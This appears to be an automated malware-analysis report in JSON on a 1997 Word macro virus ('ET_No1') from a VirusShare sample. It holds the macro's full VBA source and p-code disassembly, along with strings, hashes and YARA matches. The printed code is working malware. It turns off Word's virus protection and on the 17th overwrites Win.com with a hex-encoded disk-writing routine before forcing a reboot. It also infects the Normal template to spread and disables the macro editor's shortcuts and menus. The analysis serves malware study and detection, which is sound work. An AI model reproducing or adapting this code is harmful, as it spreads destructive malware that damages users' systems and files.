{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"ET_No1\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Binary": "May read or write a binary file",
            "Call": "May call a DLL using Excel 4 Macros",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Lib": "May run code from a DLL",
            "Open": "May open a file",
            "Put": "May write to a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "Write": "May write to a file"
        },
        "macro": "\n\nPrivate Declare Function GetWindowsDirectory Lib \"kernel32\" Alias \"GetWindowsDirectoryA\" (ByVal lpBuffer As String, ByVal nSize As Long) As Long\nAttribute GetWindowsDirectory.VB_ProcData.VB_Invoke_Func = \"ProVirus.Virus.AutoOpen\"\nPrivate Declare Function ExitWindowsEx Lib \"User32\" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long\nSub AutoOpen()\n'\nDim DD As Byte\n\n    On Error Resume Next\n    \n    Options.VirusProtection = False\n    \n    If Day(Date) = 17 Then\n        Txt1 = \"E9FD09\"\n        Txt2 = \"B80103BB0080B90100BA8000CD13E9FC04\"\n        windir$ = String(144, \" \")\n        l = GetWindowsDirectory(windir$, 144)\n        windir = Left(windir$, l)\n        Open windir + \"\\Win.com\" For Binary Access Write Lock Read As #1\n            For i = 1 To 3\n                DD = \"&H\" + Mid(Txt1, 2 * i - 1, 2)\n                Put #1, , DD\n            Next i\n            For i = 1 To 17\n                DD = \"&H\" + Mid(Txt2, 2 * i - 1, 2)\n                Put #1, 2560 + i, DD\n            Next i\n        Close #1\n        Call ExitWindowsEx(6, 0)\n    End If\n       \n       DocName = ActiveDocument.Path + \"\\\" + ActiveDocument.Name\n       DotName = NormalTemplate.Path + \"\\\" + NormalTemplate.Name\n    If CommandBars(\"Visual Basic\").Controls(1).Caption <> \"ETKill\" Then\n       Application.OrganizerDelete Source:=DotName, Name:=\"ET_No1\", Object:=wdOrganizerObjectProjectItems\n       Application.OrganizerCopy Source:=DocName, Destination:=DotName, Name:=\"ET_No1\", Object:=wdOrganizerObjectProjectItems\n       DelTools\n       CustomizationContext = NormalTemplate\n       FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable\n       CustomizationContext = NormalTemplate\n       FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable\n       For k = 1 To CommandBars(\"Visual Basic\").Controls.Count\n            CommandBars(\"Visual Basic\").Controls(1).Delete\n       Next k\n       Set MyFlag = CommandBars(\"Visual Basic\").Controls.Add(Type:=msoControlButton, ID:=752)\n       MyFlag.FaceId = 30\n       CommandBars(\"Visual Basic\").Controls(1).Caption = \"ETKill\"\n       NormalTemplate.Save\n    Else\n       Application.OrganizerCopy Source:=DotName, Destination:=DocName, Name:=\"ET_No1\", Object:=wdOrganizerObjectProjectItems\n       ActiveDocument.Save\n    End If\nEnd Sub\n\nSub DelTools()\n    For i = 1 To CommandBars(\"Tools\").Controls.Count\n       If CommandBars(\"Tools\").Controls(i).Caption = \"\u00ba\u00ea(&M)\" Then\n            CommandBars(\"Tools\").Controls(i).Delete\n            Exit For\n       End If\n    Next i\n    For i = 1 To CommandBars(\"Tools\").Controls.Count\n       If CommandBars(\"Tools\").Controls(i).Caption = \"\u00d7\u00d4\u00b6\u00a8\u00d2\u00e5(&C)...\" Then\n            CommandBars(\"Tools\").Controls(i).Delete\n            Exit For\n       End If\n    Next i\n    Application.OnTime When:=Now + TimeValue(\"00:0:01\"), Name:=\"DelTools\"\nEnd Sub\n\n' Processing file: VirusShare_2126373a2e90c4391f6097c37be774cb\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 903 bytes\n' Macros/VBA/ET_No1 - 4814 bytes\n' Line #0:\n' \tFuncDefn (Private Declare Function GetWindowsDirectory Lib \"kernel32\" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)\n' Line #1:\n' \tFuncDefn (Private Declare Function ExitWindowsEx Lib \"User32\" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long)\n' Line #2:\n' \tFuncDefn (Sub AutoOpen())\n' Line #3:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #4:\n' \tDim \n' \tVarDefn DD (As Byte)\n' Line #5:\n' Line #6:\n' \tOnError (Resume Next) \n' Line #7:\n' Line #8:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #9:\n' Line #10:\n' \tLd Date \n' \tArgsLd Day 0x0001 \n' \tLitDI2 0x0011 \n' \tEq \n' \tIfBlock \n' Line #11:\n' \tLitStr 0x0006 \"E9FD09\"\n' \tSt Txt1 \n' Line #12:\n' \tLitStr 0x0022 \"B80103BB0080B90100BA8000CD13E9FC04\"\n' \tSt Txt2 \n' Line #13:\n' \tLitDI2 0x0090 \n' \tLitStr 0x0001 \" \"\n' \tArgsLd String$ 0x0002 \n' \tSt windir$ \n' Line #14:\n' \tLd windir$ \n' \tLitDI2 0x0090 \n' \tArgsLd GetWindowsDirectory 0x0002 \n' \tSt l \n' Line #15:\n' \tLd windir$ \n' \tLd l \n' \tArgsLd LBound 0x0002 \n' \tSt windir \n' Line #16:\n' \tLd windir \n' \tLitStr 0x0008 \"\\Win.com\"\n' \tAdd \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Binary Access Write Lock Read)\n' Line #17:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0003 \n' \tFor \n' Line #18:\n' \tLitStr 0x0002 \"&H\"\n' \tLd Txt1 \n' \tLitDI2 0x0002 \n' \tLd i \n' \tMul \n' \tLitDI2 0x0001 \n' \tSub \n' \tLitDI2 0x0002 \n' \tArgsLd Mid$ 0x0003 \n' \tAdd \n' \tSt DD \n' Line #19:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tLd DD \n' \tPutRec \n' Line #20:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #21:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0011 \n' \tFor \n' Line #22:\n' \tLitStr 0x0002 \"&H\"\n' \tLd Txt2 \n' \tLitDI2 0x0002 \n' \tLd i \n' \tMul \n' \tLitDI2 0x0001 \n' \tSub \n' \tLitDI2 0x0002 \n' \tArgsLd Mid$ 0x0003 \n' \tAdd \n' \tSt DD \n' Line #23:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDI2 0x0A00 \n' \tLd i \n' \tAdd \n' \tLd DD \n' \tPutRec \n' Line #24:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #25:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #26:\n' \tLitDI2 0x0006 \n' \tLitDI2 0x0000 \n' \tArgsCall (Call) ExitWindowsEx 0x0002 \n' Line #27:\n' \tEndIfBlock \n' Line #28:\n' Line #29:\n' \tLd ActiveDocument \n' \tMemLd Path \n' \tLitStr 0x0001 \"\\\"\n' \tAdd \n' \tLd ActiveDocument \n' \tMemLd New \n' \tAdd \n' \tSt DocName \n' Line #30:\n' \tLd NormalTemplate \n' \tMemLd Path \n' \tLitStr 0x0001 \"\\\"\n' \tAdd \n' \tLd NormalTemplate \n' \tMemLd New \n' \tAdd \n' \tSt DotName \n' Line #31:\n' \tLitDI2 0x0001 \n' \tLitStr 0x000C \"Visual Basic\"\n' \tArgsLd CommandBars 0x0001 \n' \tArgsMemLd Controls 0x0001 \n' \tMemLd Caption \n' \tLitStr 0x0006 \"ETKill\"\n' \tNe \n' \tIfBlock \n' Line #32:\n' \tLd DotName \n' \tParamNamed Source \n' \tLitStr 0x0006 \"ET_No1\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerDelete 0x0003 \n' Line #33:\n' \tLd DocName \n' \tParamNamed Source \n' \tLd DotName \n' \tParamNamed Destination \n' \tLitStr 0x0006 \"ET_No1\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #34:\n' \tArgsCall DelTools 0x0000 \n' Line #35:\n' \tLd NormalTemplate \n' \tSt CustomizationContext \n' Line #36:\n' \tLd wdKeyF8 \n' \tLd wdKeyAlt \n' \tArgsLd BuildKeyCode 0x0002 \n' \tArgsLd FindKey 0x0001 \n' \tArgsMemCall Disable 0x0000 \n' Line #37:\n' \tLd NormalTemplate \n' \tSt CustomizationContext \n' Line #38:\n' \tLd wdKeyF11 \n' \tLd wdKeyAlt \n' \tArgsLd BuildKeyCode 0x0002 \n' \tArgsLd FindKey 0x0001 \n' \tArgsMemCall Disable 0x0000 \n' Line #39:\n' \tStartForVariable \n' \tLd k \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitStr 0x000C \"Visual Basic\"\n' \tArgsLd CommandBars 0x0001 \n' \tMemLd Controls \n' \tMemLd Count \n' \tFor \n' Line #40:\n' \tLitDI2 0x0001 \n' \tLitStr 0x000C \"Visual Basic\"\n' \tArgsLd CommandBars 0x0001 \n' \tArgsMemLd Controls 0x0001 \n' \tArgsMemCall Delete 0x0000 \n' Line #41:\n' \tStartForVariable \n' \tLd k \n' \tEndForVariable \n' \tNextVar \n' Line #42:\n' \tSetStmt \n' \tLd msoControlButton \n' \tParamNamed TypeOf \n' \tLitDI2 0x02F0 \n' \tParamNamed ID \n' \tLitStr 0x000C \"Visual Basic\"\n' \tArgsLd CommandBars 0x0001 \n' \tMemLd Controls \n' \tArgsMemLd Add 0x0002 \n' \tSet MyFlag \n' Line #43:\n' \tLitDI2 0x001E \n' \tLd MyFlag \n' \tMemSt FaceId \n' Line #44:\n' \tLitStr 0x0006 \"ETKill\"\n' \tLitDI2 0x0001 \n' \tLitStr 0x000C \"Visual Basic\"\n' \tArgsLd CommandBars 0x0001 \n' \tArgsMemLd Controls 0x0001 \n' \tMemSt Caption \n' Line #45:\n' \tLd NormalTemplate \n' \tArgsMemCall Save 0x0000 \n' Line #46:\n' \tElseBlock \n' Line #47:\n' \tLd DotName \n' \tParamNamed Source \n' \tLd DocName \n' \tParamNamed Destination \n' \tLitStr 0x0006 \"ET_No1\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #48:\n' \tLd ActiveDocument \n' \tArgsMemCall Save 0x0000 \n' Line #49:\n' \tEndIfBlock \n' Line #50:\n' \tEndSub \n' Line #51:\n' Line #52:\n' \tFuncDefn (Sub DelTools())\n' Line #53:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tMemLd Controls \n' \tMemLd Count \n' \tFor \n' Line #54:\n' \tLd i \n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tArgsMemLd Controls 0x0001 \n' \tMemLd Caption \n' \tLitStr 0x0006 \"\u00ba\u00ea(&M)\"\n' \tEq \n' \tIfBlock \n' Line #55:\n' \tLd i \n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tArgsMemLd Controls 0x0001 \n' \tArgsMemCall Delete 0x0000 \n' Line #56:\n' \tExitFor \n' Line #57:\n' \tEndIfBlock \n' Line #58:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #59:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tMemLd Controls \n' \tMemLd Count \n' \tFor \n' Line #60:\n' \tLd i \n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tArgsMemLd Controls 0x0001 \n' \tMemLd Caption \n' \tLitStr 0x000D \"\u00d7\u00d4\u00b6\u00a8\u00d2\u00e5(&C)...\"\n' \tEq \n' \tIfBlock \n' Line #61:\n' \tLd i \n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tArgsMemLd Controls 0x0001 \n' \tArgsMemCall Delete 0x0000 \n' Line #62:\n' \tExitFor \n' Line #63:\n' \tEndIfBlock \n' Line #64:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #65:\n' \tLd Now \n' \tLitStr 0x0007 \"00:0:01\"\n' \tArgsLd TimeValue 0x0001 \n' \tAdd \n' \tParamNamed When \n' \tLitStr 0x0008 \"DelTools\"\n' \tParamNamed New \n' \tLd Application \n' \tArgsMemCall OnTime 0x0002 \n' Line #66:\n' \tEndSub \n"
    },
    "filename": "VirusShare_2126373a2e90c4391f6097c37be774cb",
    "filesize": 31232,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Author: Jack! & Rose! - T9999T :-(, Template: Normal.dot, Last Saved By: Jack! & Rose! - T9999T :-(, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Wed Jan 29 21:37:00 1997, Last Saved Time/Date: Wed Jan 29 21:37:00 1997, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "2126373a2e90c4391f6097c37be774cb",
        "sha1": "77b6086bc1f6430467eb4d071129965f6043c7ed",
        "sha256": "73c7d94c99851ae7eb80e0f3a5203a33271f150e15b1527bf6f2865a2c7f1a5c"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "/ =!",
            "Jack! & Rose! - T9999T :-(",
            "Normal.dot",
            "Jack! & Rose! - T9999T :-(",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "432efc308",
            "932efc30b",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Version",
            "CLASS",
            "BEGIN",
            "MultiUse",
            "Module1b",
            "ET_No1C",
            "GetWindowsDirectoryk",
            "lpBuffer>",
            "nSize}",
            "kernel32_",
            "ExitWindowsExN",
            "uFlags&u",
            "dwReserved",
            "User32*",
            "AutoOpen*",
            "Options",
            "VirusProtectionoD",
            "Txt1",
            "Txt2",
            "windirT",
            "DocName\u05f7",
            "ActiveDocument\\",
            "Path2",
            "DotName>h",
            "NormalTemplateq",
            "CommandBars",
            "ControlsK",
            "Caption",
            "Application*",
            "OrganizerDelete!",
            "SourceG",
            "wdOrganizerObjectProjectItems",
            "OrganizerCopy",
            "Destination\u043b",
            "DelTools",
            "CustomizationContext\u0380",
            "FindKeyo",
            "BuildKeyCodep",
            "wdKeyF8 ",
            "wdKeyAlt",
            "DisableI",
            "wdKeyF11",
            "Count0v",
            "Deletex",
            "MyFlag7",
            "Addr",
            "msoControlButtonn",
            "FaceIdi",
            "Save",
            "OnTimeT",
            "WhenoD",
            "Now%",
            "TimeValue",
            "GetWindowsDirectoryA",
            "ExitWindowsEx",
            "yFlai*",
            "c\").i,",
            "lBut",
            "ProVirus.Virus.AutoOpen",
            "n:=Now ",
            ":01\"),",
            "E9FD09'",
            "B80103BB0080B90100BA8000CD13E9FC04'",
            "\\Win.com",
            "Visual Basic$",
            "ETKill",
            "ET_No1",
            "ET_No1",
            "Visual Basic$",
            "Visual Basic$",
            "Visual Basic$",
            "ETKill",
            "Visual Basic$",
            "ET_No1",
            "Tools",
            "Tools",
            "(&M)",
            "Tools",
            "Tools",
            "Tools",
            "\u0536(&C)...",
            "Tools",
            "00:0:01",
            "DelTools",
            "Attribut",
            "e VB_Nam",
            "e = \"ET_",
            "No1\"",
            "lDecl",
            "are Func",
            "tion Get",
            "WindowsD",
            "irectory",
            " Lib \"ke",
            "rnel32\" Alias \"",
            "A\" (ByVa",
            "l lpBuffer As S",
            "ng, ",
            "Long)Y",
            "ProcData",
            "Invoke_",
            "Virus.",
            "AutoOpe\"nsExi",
            "tExapUsero",
            "au`Flags",
            "_dwRe",
            "!aSub ",
            "Byte ",
            "On Error ",
            "Next",
            "\u0184gnt\u0101= Fals",
            "If Day(",
            "e)17 Th",
            "A\tTxt1HE9FD09D",
            "B801",
            "03BB0080",
            "0BA80@00CD13",
            "wir$",
            "Cu(144, \" \"@;",
            "Left",
            "sB \t+ \"\\@.@com\" FPB",
            "Acce@ss WriL(ockVa",
            "1 Txo 3",
            "H\" + Mid",
            "(AP, 2 * i - 1",
            "Put #",
            ",g@{",
            " 1.7",
            " 2 25",
            "60.i",
            "Call c(6, 0$",
            "End If",
            "(DocDAve",
            "Znt.Path@",
            "\"\\)l",
            "NormalTempl +",
            "`Comman",
            "dBars(\"V",
            "isuBasi",
            "c\").Cont@rols(1`",
            "k <>Kil",
            "l\"KfAppli",
            "ca!p.Organ",
            "rDele",
            "Source:=$Do",
            ", Obj`u:x=wdF",
            "I0tems",
            "Co8py ",
            "\"+@9est ]",
            "Customiz",
            "FKey( Build",
            "de(w!",
            "Alt)).Disabl\u0116 ",
            "yF1 n",
            "Mlk%}Cls",
            "Eun$\"$",
            "JJ#D",
            "Set MyA",
            "Ad@DypMmso",
            "utton, ID:=752C",
            ".FaceId ",
            "1w1bb1&",
            "l7Sav",
            ",zer,T3D,$.4454",
            "z1x`",
            "dfaJ",
            "22XD'\\\"G",
            "(&M)<G",
            "9Zg:g",
            "\tCDU#\u0536",
            "(&C)..j.o",
            "Z(nTi",
            ":=Now",
            "ue(\"00:",
            "1\")V\\",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "c2.tlb#O",
            "LE Autom`ation",
            "mMSForms",
            "2F03443-",
            "EEC9-11D@3-99CA",
            "0954508F",
            "3.TWD#",
            "Microsof",
            "` Ob",
            " Library",
            "P4,PJP\\VBE\\(EX(",
            "KCxN@UalCxNETax",
            " +\t-,C",
            "OfficDO@f",
            "G{2DF8",
            "D04C-5BF",
            "A-101B-BHDE5",
            "fAA@4",
            "fPROGR",
            "AM FILES",
            "\\MICROSO",
            "FT OFFIC",
            "MSO970.DLLHk# 8",
            "BThi",
            "sDocumenDt",
            "@1TD",
            "h@6s",
            "DIcD",
            "$*\"B",
            "ET_No1",
            "ThisDocument",
            "ET_No1",
            "ID=\"{97A77F72-7A30-11D0-99CB-0040954508FF}\"",
            "Document=ThisDocument/&H00000000",
            "Module=ET_No1",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"999B28482C482C482C482C\"",
            "DPB=\"B6B4077839885789578957\"",
            "GC=P",
            "\"D3D1629F7EA07EA081\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "ET_No1=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.318096",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
